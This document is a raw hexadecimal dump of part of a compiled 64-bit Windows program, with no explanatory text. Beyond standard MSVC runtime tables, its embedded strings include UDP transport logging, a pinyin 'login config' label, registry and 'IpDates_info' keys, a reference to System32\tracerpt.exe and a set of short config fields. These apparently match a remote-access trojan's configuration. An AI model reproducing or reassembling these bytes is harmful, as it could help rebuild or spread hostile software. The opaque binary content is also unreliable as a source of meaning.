0001600000000000080A2D9010000000000B4D90100000000006F00000000000080CCD901000000000009000000000000807400000000000080000000000000000000000000000000004C750140010000008475014001000000E074014001000000F07401400100000000000000000000000000000000000000D895004001000000BCEA00400100000010F50040010000006CCF00400100000000000000000000000000000000000000C4120140010000009CEB0040010000000000000000000000000000000000000000000000000000000000000000000000D088004001000000E088004001000000008900400100000040890040010000005089004001000000E0890040010000009C89004001000000588A004001000000A889004001000000B489004001000000B88900400100000060AF014001000000348E004001000000D8AF014001000000C88F004001000000AC8E004001000000556E6B6E6F776E20657863657074696F6E0000000000000078B00140010000001013004001000000AC8E00400100000062616420616C6C6F636174696F6E000063736DE00100000000000000000000000000000000000000040000000000000020059319000000000000000000000000000000000000000000000000000000001002024001000000B002024001000000436F724578697450726F6365737300006D00730063006F007200650065002E0064006C006C000000720075006E00740069006D00650020006500720072006F0072002000000000000D000A000000000054004C004F005300530020006500720072006F0072000D000A00000000000000530049004E00470020006500720072006F0072000D000A00000000000000000044004F004D00410049004E0020006500720072006F0072000D000A0000000000520036003000330033000D000A002D00200041007400740065006D0070007400200074006F00200075007300650020004D00530049004C00200063006F00640065002000660072006F006D0020007400680069007300200061007300730065006D0062006C007900200064007500720069006E00670020006E0061007400690076006500200063006F0064006500200069006E0069007400690061006C0069007A006100740069006F006E000A005400680069007300200069006E006400690063006100740065007300200061002000620075006700200069006E00200079006F007500720020006100700070006C00690063006100740069006F006E002E0020004900740020006900730020006D006F007300740020006C0069006B0065006C0079002000740068006500200072006500730075006C00740020006F0066002000630061006C006C0069006E006700200061006E0020004D00530049004C002D0063006F006D00700069006C0065006400200028002F0063006C00720029002000660075006E006300740069006F006E002000660072006F006D002000610020006E0061007400690076006500200063006F006E007300740072007500630074006F00720020006F0072002000660072006F006D00200044006C006C004D00610069006E002E000D000A0000000000520036003000330032000D000A002D0020006E006F007400200065006E006F00750067006800200073007000610063006500200066006F00720020006C006F00630061006C006500200069006E0066006F0072006D006100740069006F006E000D000A00000000000000000000000000520036003000330031000D000A002D00200041007400740065006D0070007400200074006F00200069006E0069007400690061006C0069007A0065002000740068006500200043005200540020006D006F007200650020007400680061006E0020006F006E00630065002E000A005400680069007300200069006E006400690063006100740065007300200061002000620075006700200069006E00200079006F007500720020006100700070006C00690063006100740069006F006E002E000D000A0000000000520036003000330030000D000A002D00200043005200540020006E006F007400200069006E0069007400690061006C0069007A00650064000D000A00000000000000000000000000520036003000320038000D000A002D00200075006E00610062006C006500200074006F00200069006E0069007400690061006C0069007A006500200068006500610070000D000A000000000000000000520036003000320037000D000A002D0020006E006F007400200065006E006F00750067006800200073007000610063006500200066006F00720020006C006F00770069006F00200069006E0069007400690061006C0069007A006100740069006F006E000D000A000000000000000000520036003000320036000D000A002D0020006E006F007400200065006E006F00750067006800200073007000610063006500200066006F007200200073007400640069006F00200069006E0069007400690061006C0069007A006100740069006F006E000D000A000000000000000000520036003000320035000D000A002D002000700075007200650020007600690072007400750061006C002000660075006E006300740069006F006E002000630061006C006C000D000A00000000000000520036003000320034000D000A002D0020006E006F007400200065006E006F00750067006800200073007000610063006500200066006F00720020005F006F006E0065007800690074002F0061007400650078006900740020007400610062006C0065000D000A000000000000000000520036003000310039000D000A002D00200075006E00610062006C006500200074006F0020006F00700065006E00200063006F006E0073006F006C00650020006400650076006900630065000D000A0000000000000000000000000000000000520036003000310038000D000A002D00200075006E00650078007000650063007400650064002000680065006100700020006500720072006F0072000D000A0000000000000000000000000000000000520036003000310037000D000A002D00200075006E006500780070006500630074006500640020006D0075006C007400690074006800720065006100640020006C006F0063006B0020006500720072006F0072000D000A000000000000000000520036003000310036000D000A002D0020006E006F007400200065006E006F00750067006800200073007000610063006500200066006F0072002000740068007200650061006400200064006100740061000D000A0000000000000000000000520036003000310030000D000A002D002000610062006F007200740028002900200068006100730020006200650065006E002000630061006C006C00650064000D000A00000000000000000000000000520036003000300039000D000A002D0020006E006F007400200065006E006F00750067006800200073007000610063006500200066006F007200200065006E007600690072006F006E006D0065006E0074000D000A0000000000000000000000520036003000300038000D000A002D0020006E006F007400200065006E006F00750067006800200073007000610063006500200066006F007200200061007200670075006D0065006E00740073000D000A000000000000000000000000000000520036003000300032000D000A002D00200066006C006F006100740069006E006700200070006F0069006E007400200073007500700070006F007200740020006E006F00740020006C006F0061006400650064000D000A0000000000000000000200000000000000708E0140010000000800000000000000108E0140010000000900000000000000B08D0140010000000A00000000000000608D0140010000001000000000000000008D0140010000001100000000000000A08C0140010000001200000000000000508C0140010000001300000000000000F08B0140010000001800000000000000808B0140010000001900000000000000308B0140010000001A00000000000000C08A0140010000001B00000000000000508A0140010000001C00000000000000008A0140010000001E00000000000000B8890140010000001F00000000000000F088014001000000200000000000000080880140010000002100000000000000908601400100000078000000000000007086014001000000790000000000000050860140010000007A000000000000003086014001000000FC000000000000002886014001000000FF0000000000000008860140010000004D006900630072006F0073006F00660074002000560069007300750061006C00200043002B002B002000520075006E00740069006D00650020004C00690062007200610072007900000000000A000A0000000000000000002E002E002E0000003C00700072006F006700720061006D0020006E0061006D006500200075006E006B006E006F0077006E003E0000000000520075006E00740069006D00650020004500720072006F00720021000A000A00500072006F006700720061006D003A00200000000000000028006E0075006C006C00290000000000286E756C6C290000060000060001000010000306000602100445454505050505053530005000000000282038505807080037303057500700002020080000000008606860606060000078707878787808070800000700080808000008000800070800000000000000050000C00B00000000000000000000001D0000C0040000000000000000000000960000C00400000000000000000000008D0000C00800000000000000000000008E0000C00800000000000000000000008F0000C0080000000000000000000000900000C0080000000000000000000000910000C0080000000000000000000000920000C0080000000000000000000000930000C0080000000000000000000000B40200C0080000000000000000000000B50200C00800000000000000000000000300000009000000C00000000C00000006808086808180000010038680868280140505454545858585050000303080508088000800282738505780000700373030505088000000202880888080000000606860686868080807787070777070080800000800080007080000000000000020436F6D706C657465204F626A656374204C6F6361746F72270000000000000020436C617373204869657261726368792044657363726970746F722700000000204261736520436C61737320417272617927000000000000204261736520436C6173732044657363726970746F722061742028000000000020547970652044657363726970746F722700000000000000606C6F63616C2073746174696320746872656164206775617264270000000000606D616E6167656420766563746F7220636F707920636F6E7374727563746F72206974657261746F722700000000000060766563746F7220766261736520636F707920636F6E7374727563746F72206974657261746F7227000000000000000060766563746F7220636F707920636F6E7374727563746F72206974657261746F72270000000000006064796E616D6963206174657869742064657374727563746F7220666F72202700000000000000006064796E616D696320696E697469616C697A657220666F72202700000000000060656820766563746F7220766261736520636F707920636F6E7374727563746F72206974657261746F7227000000000060656820766563746F7220636F707920636F6E7374727563746F72206974657261746F7227000000606D616E6167656420766563746F722064657374727563746F72206974657261746F722700000000606D616E6167656420766563746F7220636F6E7374727563746F72206974657261746F722700000060706C6163656D656E742064656C6574655B5D20636C6F73757265270000000060706C6163656D656E742064656C65746520636C6F7375726527000000000000606F6D6E692063616C6C7369672700002064656C6574655B5D000000206E65775B5D000000000000606C6F63616C2076667461626C6520636F6E7374727563746F7220636C6F73757265270000000000606C6F63616C2076667461626C65270060525454490000006045480000000000607564742072657475726E696E67270060636F707920636F6E7374727563746F7220636C6F737572652700000000000060656820766563746F7220766261736520636F6E7374727563746F72206974657261746F7227000060656820766563746F722064657374727563746F72206974657261746F72270060656820766563746F7220636F6E7374727563746F72206974657261746F72270000000000000000607669727475616C20646973706C6163656D656E74206D61702700000000000060766563746F7220766261736520636F6E7374727563746F72206974657261746F7227000000000060766563746F722064657374727563746F72206974657261746F72270000000060766563746F7220636F6E7374727563746F72206974657261746F7227000000607363616C61722064656C6574696E672064657374727563746F7227000000006064656661756C7420636F6E7374727563746F7220636C6F737572652700000060766563746F722064656C6574696E672064657374727563746F7227000000006076626173652064657374727563746F722700000000000060737472696E67270000000000000000606C6F63616C20737461746963206775617264270000000060747970656F66270000000000000000607663616C6C27006076627461626C6527000000000000006076667461626C65270000005E3D00007C3D0000263D00003C3C3D003E3E3D00253D00002F3D00002D3D00002B3D00002A3D00007C7C0000262600007C0000005E0000007E000000282900002C0000003E3D00003E0000003C3D00003C000000250000002F0000002D3E2A00260000002B0000002D0000002D2D00002B2B00002A0000002D3E00006F70657261746F72000000005B5D0000213D00003D3D0000210000003C3C00003E3E00003D0000002064656C65746500206E6577000000005F5F756E616C69676E656400000000005F5F72657374726963740000000000005F5F7074723634005F5F6561626900005F5F636C7263616C6C000000000000005F5F6661737463616C6C0000000000005F5F7468697363616C6C0000000000005F5F73746463616C6C000000000000005F5F70617363616C00000000000000005F5F636465636C005F5F6261736564280000000000000000B098014001000000A898014001000000989801400100000088980140010000007898014001000000689801400100000058980140010000005098014001000000489801400100000038980140010000002898014001000000259801400100000020980140010000001898014001000000149801400100000010980140010000000C98014001000000089801400100000004980140010000000098014001000000FC97014001000000F097014001000000EC97014001000000E897014001000000E497014001000000E097014001000000DC97014001000000D897014001000000D497014001000000D097014001000000CC97014001000000C897014001000000C497014001000000C097014001000000BC97014001000000B897014001000000B497014001000000B097014001000000AC97014001000000A897014001000000A497014001000000A0970140010000009C970140010000009897014001000000949701400100000090970140010000008C970140010000008897014001000000849701400100000080970140010000007C97014001000000789701400100000074970140010000006897014001000000589701400100000050970140010000004097014001000000289701400100000018970140010000000097014001000000E096014001000000C096014001000000A0960140010000008096014001000000609601400100000038960140010000001896014001000000F095014001000000D095014001000000A895014001000000889501400100000078950140010000007095014001000000689501400100000058950140010000003095014001000000249501400100000018950140010000000895014001000000E894014001000000C894014001000000A0940140010000007894014001000000509401400100000020940140010000000094014001000000D893014001000000B09301400100000080930140010000005093014001000000309301400100000025980140010000001893014001000000F892014001000000E092014001000000C092014001000000A09201400100000047657450726F6365737357696E646F7753746174696F6E00476574557365724F626A656374496E666F726D6174696F6E57000000000000004765744C617374416374697665506F70757000000000000047657441637469766557696E646F77004D657373616765426F785700000000005500530045005200330032002E0044004C004C0000000000480048003A006D006D003A0073007300000000000000000064006400640064002C0020004D004D004D004D002000640064002C002000790079007900790000004D004D002F00640064002F00790079000000000050004D000000000041004D00000000000000000044006500630065006D0062006500720000000000000000004E006F00760065006D0062006500720000000000000000004F00630074006F006200650072000000530065007000740065006D00620065007200000000000000410075006700750073007400000000004A0075006C00790000000000000000004A0075006E006500000000000000000041007000720069006C000000000000004D0061007200630068000000000000004600650062007200750061007200790000000000000000004A0061006E007500610072007900000044006500630000004E006F00760000004F00630074000000530065007000000041007500670000004A0075006C0000004A0075006E0000004D0061007900000041007000720000004D0061007200000046006500620000004A0061006E000000530061007400750072006400610079000000000000000000460072006900640061007900000000005400680075007200730064006100790000000000000000005700650064006E0065007300640061007900000000000000540075006500730064006100790000004D006F006E0064006100790000000000530075006E0064006100790000000000530061007400000046007200690000005400680075000000570065006400000054007500650000004D006F006E000000530075006E00000048483A6D6D3A73730000000000000000646464642C204D4D4D4D2064642C207979797900000000004D4D2F64642F797900000000504D0000414D000000000000446563656D62657200000000000000004E6F76656D62657200000000000000004F63746F6265720053657074656D62657200000041756775737400004A756C79000000004A756E6500000000417072696C0000004D6172636800000000000000466562727561727900000000000000004A616E7561727900446563004E6F76004F63740053657000417567004A756C004A756E004D617900417072004D617200466562004A616E00536174757264617900000000467269646179000000000000546875727364617900000000000000005765646E65736461790000000000000054756573646179004D6F6E646179000053756E646179000053617400467269005468750057656400547565004D6F6E0053756E00000000000102030405060708090A0B0C0D0E0F101112131415161718191A1B1C1D1E1F202122232425262728292A2B2C2D2E2F303132333435363738393A3B3C3D3E3F404142434445464748494A4B4C4D4E4F505152535455565758595A5B5C5D5E5F606162636465666768696A6B6C6D6E6F707172737475767778797A7B7C7D7E7F00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000002000200020002000200020002000200020002800280028002800280020002000200020002000200020002000200020002000200020002000200020002000200048001000100010001000100010001000100010001000100010001000100010008400840084008400840084008400840084008400100010001000100010001000100081008100810081008100810001000100010001000100010001000100010001000100010001000100010001000100010001000100100010001000100010001000820082008200820082008200020002000200020002000200020002000200020002000200020002000200020002000200020002001000100010001000200000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000020002000200020002000200020002000200068002800280028002800200020002000200020002000200020002000200020002000200020002000200020002000480010001000100010001000100010001000100010001000100010001000100084008400840084008400840084008400840084001000100010001000100010001000810181018101810181018101010101010101010101010101010101010101010101010101010101010101010101010101010101011000100010001000100010008201820182018201820182010201020102010201020102010201020102010201020102010201020102010201020102010201020110001000100010002000200020002000200020002000200020002000200020002000200020002000200020002000200020002000200020002000200020002000200020002000200020004800100010001000100010001000100010001000100010001000100010001000100010001400140010001000100010001000140010001000100010001000100001010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101100001010101010101010101010101010201020102010201020102010201020102010201020102010201020102010201020102010201020102010201020102011000020102010201020102010201020102010101000000000000000000000000808182838485868788898A8B8C8D8E8F909192939495969798999A9B9C9D9E9FA0A1A2A3A4A5A6A7A8A9AAABACADAEAFB0B1B2B3B4B5B6B7B8B9BABBBCBDBEBFC0C1C2C3C4C5C6C7C8C9CACBCCCDCECFD0D1D2D3D4D5D6D7D8D9DADBDCDDDEDFE0E1E2E3E4E5E6E7E8E9EAEBECEDEEEFF0F1F2F3F4F5F6F7F8F9FAFBFCFDFEFF000102030405060708090A0B0C0D0E0F101112131415161718191A1B1C1D1E1F202122232425262728292A2B2C2D2E2F303132333435363738393A3B3C3D3E3F406162636465666768696A6B6C6D6E6F707172737475767778797A5B5C5D5E5F606162636465666768696A6B6C6D6E6F707172737475767778797A7B7C7D7E7F808182838485868788898A8B8C8D8E8F909192939495969798999A9B9C9D9E9FA0A1A2A3A4A5A6A7A8A9AAABACADAEAFB0B1B2B3B4B5B6B7B8B9BABBBCBDBEBFC0C1C2C3C4C5C6C7C8C9CACBCCCDCECFD0D1D2D3D4D5D6D7D8D9DADBDCDDDEDFE0E1E2E3E4E5E6E7E8E9EAEBECEDEEEFF0F1F2F3F4F5F6F7F8F9FAFBFCFDFEFF808182838485868788898A8B8C8D8E8F909192939495969798999A9B9C9D9E9FA0A1A2A3A4A5A6A7A8A9AAABACADAEAFB0B1B2B3B4B5B6B7B8B9BABBBCBDBEBFC0C1C2C3C4C5C6C7C8C9CACBCCCDCECFD0D1D2D3D4D5D6D7D8D9DADBDCDDDEDFE0E1E2E3E4E5E6E7E8E9EAEBECEDEEEFF0F1F2F3F4F5F6F7F8F9FAFBFCFDFEFF000102030405060708090A0B0C0D0E0F101112131415161718191A1B1C1D1E1F202122232425262728292A2B2C2D2E2F303132333435363738393A3B3C3D3E3F404142434445464748494A4B4C4D4E4F505152535455565758595A5B5C5D5E5F604142434445464748494A4B4C4D4E4F505152535455565758595A7B7C7D7E7F808182838485868788898A8B8C8D8E8F909192939495969798999A9B9C9D9E9FA0A1A2A3A4A5A6A7A8A9AAABACADAEAFB0B1B2B3B4B5B6B7B8B9BABBBCBDBEBFC0C1C2C3C4C5C6C7C8C9CACBCCCDCECFD0D1D2D3D4D5D6D7D8D9DADBDCDDDEDFE0E1E2E3E4E5E6E7E8E9EAEBECEDEEEFF0F1F2F3F4F5F6F7F8F9FAFBFCFDFEFF43004F004E004F00550054002400000000B00140010000000010004001000000BEB61FEBDA5246BA923359DBBFE6C8E400100000000000005B524F5D20256C6420627974657300007265637620736E3D256C7500000000005B52495D202564206279746573000000696E7075742061636B3A20736E3D256C75207274743D256C642072746F3D256C6400000000000000696E707574207073683A20736E3D256C752074733D256C750000000000000000696E7075742070726F62650000000000696E7075742077696E733A20256C750048B10140010000007087004001000000C0B10140010000001033004001000000305A0040010000006038004001000000E03E0040010000009033004001000000103C004001000000000000000000000064003300330066003300350031006100340061006500650061003500650036003000380038003500330064003100610035003600360036003100300035003900000000000000000064656E676C757065697A68690000000053004F00460054005700410052004500000000000000000049007000440061007400650073005F0069006E0066006F00000000000000000043006F006E0073006F006C0065005C00310000000000000057696E646F77735C53797374656D33325C74726163657270742E657865000000257325730000000090B20140010000006068004001000000C067004001000000700031003A0000006F0031003A000000740031003A000000700032003A0000006F0032003A000000740032003A000000700033003A0000006F0033003A000000740033003A000000640064003A00000063006C003A00000066007A003A000000620062003A00000062007A003A0000006A0070003A000000730078003A000000620068003A0000006C006C003A00000064006C003A000000730068003A0000006B006C003A000000620064003A00000043006F006E0073006F006C006500000049007000440061007400650000000000440062006700480065006C0070002E0064006C006C0000004D696E6944756D70577269746544756D7000000000000000210061006E0061006C0079007A00650020002D0076000000250073002D002500300034006400250030003200640025003000320064002D002500300032006400250030003200640025003000320064002E0064006D007000000000000000000088B30140010000004053004001000000305A004001000000B055004001000000E03E0040010000005053004001000000B05900400100000010B3014001000000708700400100000070870040010000007088004001000000000000000000503F220593190100000034C301000000000000000000030000003CC30100200000000000000001000000220593190200000058C70100000000000000000004000000F8C50100200000000000000001000000220593190C00000030C6010000000000000000000E00000090C60100200000000000000001000000220593190200000058C7010000000000000000000400000068C701002000000000000000010000002205931902000000A8C70100000000000000000005000000B8C701002000000000000000010000002205931901000000FCC7010000000000000000000B00000004C80100200000000000000001000000220593190200000078C8010000000000000000000E00000088C801002000000000000000010000006C18014001000000000000000000F03F6365696C0000000000000000000000002900008001000000000000000000000000000000000000000F000000000000002005931900000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000652B303030000000883301400100000008B40140010000004830014001000000AC8E00400100000062616420657863657074696F6E0000005F6E657874616674657200005F6C6F67620000005F796E005F7931005F7930006672657870000000666D6F64000000005F6879706F7400005F636162730000006C646578700000006D6F6466000000006661627300000000666C6F6F7200000074616E00636F730073696E0073717274000000006174616E320000006174616E0000000061636F73000000006173696E0000000074616E6800000000636F73680000000073696E68000000006C6F6731300000006C6F6700706F7700657870003123514E414E00003123494E460000003123494E440000003123534E414E00000000000000000000FFFFFFFFFFFF3F43FFFFFFFFFFFF3FC301000000000000000000000030E0010088AF010060AF010000000000000000000000000000000000000000000000000001000000A0AF01000000000000000000B0AF010000000000000000000000000030E001000000000000000000FFFFFFFF000000004000000088AF010000000000000000000000000001000000000000000000000050F30100F8B00100D8AF01000000000000000000000000000000000001000000000000000000000008F3010028B0010000B001000000000000000000000000000000000000000000000000000100000040B00100000000000000000050B0010000000000000000000000000008F301000000000000000000FFFFFFFF000000004000000028B0010000000000000000000000000001000000000000000000000078F30100A0B0010078B0010000000000000000000000000000000000000000000000000002000000B8B00100000000000000000020B10100D0B001000000000000000000000000000000000050F301000000000000000000FFFFFFFF0000000040000000F8B0010000000000000000000000000000000000000000000100000010B101000000000000000000D0B0010000000000000000000000000078F301000100000000000000FFFFFFFF0000000040000000A0B00100000000000000000000000000010000000000000000000000A0F3010070B1010048B101000000000000000000000000000000000000000000000000000100000088B10100000000000000000098B10100000000000000000000000000A0F301000000000000000000FFFFFFFF000000004000000070B10100000000000000000000000000010000000000000000000000C0F30100E8B10100C0B101000000000000000000000000000000000000000000000000000200000000B20100000000000000000018B2010068B2010000000000000000000000000000000000C0F301000100000000000000FFFFFFFF0000000040000000E8B1010000000000000000000000000000000000000000000100000058B20100000000000000000068B20100000000000000000000000000E8F301000000000000000000FFFFFFFF000000004000000040B2010000000000000000000000000001000000000000000000000010F40100B8B2010090B2010000000000000000000000000000000000000000000000000002000000D0B201000000000000000000E8B2010098B101000000000000000000000000000000000010F401000100000000000000FFFFFFFF0000000040000000B8B2010000000000000000000000000001000000000000000000000020FC010038B3010010B301000000000000000000000000000000000000000000000000000100000050B30100000000000000000060B3010000000000000000000000000020FC01000000000000000000FFFFFFFF000000004000000038B3010000000000000000000000000001000000000000000000000058FC0100B0B3010088B3010000000000000000000000000000000000000000000000000002000000C8B301000000000000000000E0B3010068B201000000000000000000000000000000000058FC01000100000000000000FFFFFFFF0000000040000000B0B3010000000000000000000000000001000000000000000000000088FC010030B4010008B401000000000000000000000000000000000000000000000000000200000048B40100000000000000000060B40100D0B001000000000000000000000000000000000088FC01000100000000000000FFFFFFFF000000004000000030B4010000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000106020006320230010000000000000001000000011406001464070014340600143210700114080014640E0014540D0014340C0014921070090401000442000050BC0000010000003A9400004F940000706E01004F94000001180A0018640D0018540B0018340A00185214D012C0107011190A0019740A001964090019340800193215E013D011C050BC0000010000003E960000049700008E6E010000000000011B0A001B7410001B640F001B340E001B9214D012C010500106020006520230090A04000A3409000A52067050BC000001000000B09900004F9A0000706E01004F9A0000011206001274100012340F0012B20B50010C02000C011100110602000652023050BC0000010000007C9C0000C49C0000A46E01000000000000000000010000000000000001000000010F04000F3406000F320B70111C0A001C640F001C340E001C7218F016E014D012C0107050BC0000010000001FA100002DA20000BF6E010000000000192D0B001B6451001B5450001B344F001B014A0014D012C01070000068DC000040020000192E09001D64C4001D34C3001D01BE000EC00C700B50000068DC0000E00500000114080014640A00145409001434080014521070010401000462000011170A0017640E0017340D00175213F011E00FD00DC00B7050BC0000010000006DA90000FBA90000E36E010000000000011708001764090017540800173407001732137019300B001F3464001F015A0010F00EE00CD00AC0087007600650000068DC0000C802000001000000110A04000A3406000A32067050BC00000200000052B900005CB90000016F01000000000071B9000098B90000216F0100000000000106020006320250111304001334070013320F7050BC000002000000F8BA000025BB0000016F01000000000037BB00006EBB0000216F01000000000001200C00206411002054100020340E0020721CF01AE018D016C0147001190A0019740900196408001954070019340600193215C0011808001864080018540700183406001832147001190A0019340E00193215F013E011D00FC00D700C600B5001190A0019740B0019640A001954090019340800195215C00115090015D4050015740400156403001534020015E00000010C06000C340C000C52087007600650011C0B001C7418001C5417001C3416001C01120015E013D011C00000010A04000A3408000A32067001150800157408001564070015340600153211C011150800157408001564070015340600153211D050BC00000100000073D90000B1D900003C6F010000000000000000000107020007019B00010000000100000001000000090401000442000050BC000001000000A9DA0000ADDA000001000000ADDA0000090401000442000050BC000001000000CEDA0000D2DA000001000000D2DA0000090401000442000050BC000001000000C7DB0000FADB0000606F0100FADB0000191E08000F920BE009D007C0057004600350023068DC0000480000001115080015340B00153211E00FD00DC00B700A6050BC00000100000051E1000085E10000826F01000000000019360B00253471032501660310F00EE00CD00AC0087007600650000068DC0000201B00001115080015340B00153211E00FD00DC00B700A6050BC00000100000095E90000C7E90000826F010000000000192F09001E74B5001E64B4001E34B3001E01B0001050000068DC000070050000110A04000A3407000A32067050BC000001000000AAEF000001F000009B6F0100000000000106020006720230191F08001034100010720CD00AC008700760065068DC00003800000011190A0019C40B0019740A001964090019340800195215D050BC00000100000010F40000BCF400009B6F010000000000110602000632023050BC0000010000007BF8000091F80000B66F010000000000011506001534100015B20E700D600C50011B0A001BC40F001B740E001B640D001B340C001B921450010F06000F5407000F3406000F320B7011190A0019C40900197408001964070019340600193215E050BC0000010000009A010100BB010100D16F0100000000000109010009620000000000000104010004120000110F06000F6409000F3408000F520B7050BC000001000000FA0201006E030100EC6F01000000000011190A0019740C0019640B0019340A00195215F013D011C050BC000002000000B6040100FA04010007700100000000007D040100130501003770010000000000192D0D451F7412001B6411001734100013430E920AF008E006D004C00250000068DC000048000000010F06000F6411000F3410000FD20B70192D0D351F7410001B640F0017340E0013330E720AF008E006D004C00250000068DC000030000000010F06000F640F000F340E000FB20B70010E02000E320A30010A02000A320630011006001064110010B209C007700650010000000000000001000000110F04000F3407000F320B7050BC000001000000AB130100B513010052700100000000001111060011340A0011320DC00B700A6050BC00000100000033140100771401006C700100000000001111060011340A0011320DC00B700A6050BC000001000000CB150100EF1501006C700100000000000112060012C413001274110012D20B502100000070830000B683000090BC010021000000B6830000DD8300007CBC010021000000DD830000A384000064BC01002108020008745800DD830000A384000064BC01002115040015D4520008C45900B6830000DD8300007CBC0100210802000854570070830000B683000090BC0100191C04000A0153000360023068DC0000800200000113010013420000010F06000F7403000A6402000534010021000000806C0000AE6D0000E0BC0100210802000864DA00806C0000AE6D0000E0BC0100192207001034DB001001D40009C007700650000068DC000090060000010A04000A340E000A92067021000000204200009942000050BD01002100000099420000A64200003CBD01002105020005740E0099420000A64200003CBD01002105020005340F00204200009942000050BD0100191F060010F209E007D005C00360025068DC000068000000011E0C001E740B001E640A001E5409001E3408001E321AE018D016C019240300120186000B30000068DC000020040000010A04000A3406000A32067021000000D0730000E4730000E0BD010021230E0023F4060018E4070014C40800107409000C640A0008540B0004340C00D0730000E4730000E0BD01000107010007C200002100000010330000363300000CBE0100210502000534090010330000363300000CBE010001060200065202702100000050310000783100004CBE0100210002000074060050310000783100004CBE0100210502000574060050310000783100004CBE0100010A04000A3407000A32066021000000302100005D21000080BE0100210F04000F64070005340600302100005D21000080BE010001100600107409001054080010320CC001140800146408001454070014340600143210702100020000340200E0150000F3150000CCBE01002105020005340200E0150000F3150000CCBE0100010201000270000021000000C0130000EB130000DCC501002105020005340600C0130000EB130000DCC5010021180600185407001334060000640800F01100001812000028BF01002105020005640800F01100001812000028BF010001060200063202702100020000540A00801000008A10000084BF0100210000008A100000CB10000068BF01002105020005C40B008A100000CB10000068BF01002132060032540A000DE4040005D40C00801000008A10000084BF0100010A05000A4206F00470036002300000210000006068000082680000DCBF0100210000008268000019690000C8BF01002108020008C458018268000019690000C8BF010021080200083456016068000082680000DCBF01000113050013015201047003600250000021000000B05000000251000010C001002105020005540600B05000000251000010C00100010F06000F6408000F3407000F320B7021000000D04C0000F44C000048C00100210A04000A64070005340600D04C0000F44C000048C00100010A04000A5408000A320670191F05000D343D000D013A000670000068DC0000C00100002100000080280000C0280000D4C001002100020000D4180080280000C0280000D4C001002100020000D41800C0280000C4280000C0C001002147060047F4170008D4180004741900C0280000C4280000C0C001002104020004541A0080280000C0280000D4C001000110060010011B0009E007C005600430210000005022000081220000A8B4010021000200007406005022000081220000A8B4010021050200057406005022000081220000A8B401002100000090200000AF20000048C101002116060016D40A000A6409000534080090200000AF20000048C1010001090400093205C00370025021000A0000F4040000E4050000C40D0000540B0000340A00801D0000AA1D0000BCC1010021000000AA1D0000061F00009CC101002105020005F40400AA1D0000061F00009CC101002114080014E405000FC40D000A540B0005340A00801D0000AA1D0000BCC1010001090400095205D00370026021000000701B0000021C00000CC201002100020000F40400701B0000021C00000CC20100211C08001CF4040012E40D000DC40B0005740A00701B0000021C00000CC20100010A05000A4206D0046003500230000021000000701900007E1900009CC201002100020000340600701900007E1900009CC20100210000007E1900008A19000088C20100210000008A1900008F19000074C2010021050200057408008A1900008F19000074C2010021050200055407007E1900008A19000088C201002105020005340600701900007E1900009CC20100010E02000E320A6021000000401500004E150000F0C20100210000004E1500005E150000DCC20100210A04000A740800055406004E1500005E150000DCC201002105020005640700401500004E150000F0C20100010B04000B3409000B3207C021000000501300005E130000A8B401002105020005740600501300005E130000A8B4010011180400183409000A520670881B010058AC0100FFFFFFFF9070010080870000FFFFFFFFE08700000000000009880000FFFFFFFF010F06000F6407000F3406000F320B70210004000074070000340600105E00002B5E000094C30100210A04000A74070005340600105E00002B5E000094C30100010602000632026001420C0042640C003D540B0038340A001D6803000B740D000B7207C00106020006B2023021000000604100007D410000DCC501002105020005340600604100007D410000DCC50100013F0C003F640C003A540B0035340A001A6803000B740D000B7207C0210000006038000066380000B8C9010021000000663800006B38000068C40100210000006B380000E138000044C401002105020005D408006B380000E138000044C4010021660A0066640E0061540D000FF406000AE4070005C40900663800006B38000068C401002105020005340C006038000066380000B8C90100210004000064900000348F0090360000AB360000DCC401002100000090360000AB360000DCC4010021000000AB360000FE360000C8C401002108020008649000AB360000FE360000C8C401002108020008348F0090360000AB360000DCC40100191B030009018C000270000068DC00005004000021000000903300002234000038C5010021000000223400002A34000024C501002108020008741200223400002A34000024C501002108020008341D00903300002234000038C5010019240800120113000BF009E007D005C00360025068DC0000880000002100000090230000F6230000ACC5010021000A0000F4090000E40A0000D40B0000740C0000540D0090230000F6230000ACC5010021190A0019E40A0014F409000FD40B000A740C0005540D0090230000F6230000ACC50100010D04000DD209C0076006302100000030140000AA140000DCC50100210502000534060030140000AA140000DCC50100010A04000A6407000A320670111302000A520630881B010080AC010020880000FFFFFFFF4088000001000000468800000000000051880000FFFFFFFF111D06001D640A00183409000A520670881B0100A8AC0100FFFFFFFFA070010000000000B070010001000000D070010002000000F07001000300000010710100040000003071010005000000507101000600000070710100070000009071010008000000B071010009000000D07101000A000000F0710100706F0000FFFFFFFFD16F000000000000517000000100000068700000020000009370000003000000AE70000004000000DC700000050000000A710000060000003871000007000000CD71000008000000EF710000090000000A7200000A000000257200000B00000086720000FFFFFFFF013B08003B640700365406000A3408000A320670013C08003C3406000F6408000F5407000F320B70010F06000F6409000F3408000F520B70010A04000A3408000A52067011180400183409000A520670881B0100D0AC0100FFFFFFFF10720100000000002072010070880000FFFFFFFF97880000010000009D88000000000000A8880000FFFFFFFF11200A00205414001C3412000FB20BE009D007C005700460881B0100F8AC0100FFFFFFFF30720100FFFFFFFF40720100E0800000FFFFFFFF518100000000000066810000FFFFFFFF028300000100000046830000FFFFFFFF111C08001C540C0017340B00095205C003700260881B010020AD0100FFFFFFFF50720100D0630000FFFFFFFF1B640000000000002D640000FFFFFFFF406400000000000051640000FFFFFFFF646400000000000086640000FFFFFFFF9964000000000000EC640000FFFFFFFFFC640000000000000D650000FFFFFFFF111A08001A340E000C5208D006C0047003600250881B010048AD0100FFFFFFFF607201000000000070720100805F0000FFFFFFFFBE5F000000000000D15F000001000000E45F000000000000EE5F0000FFF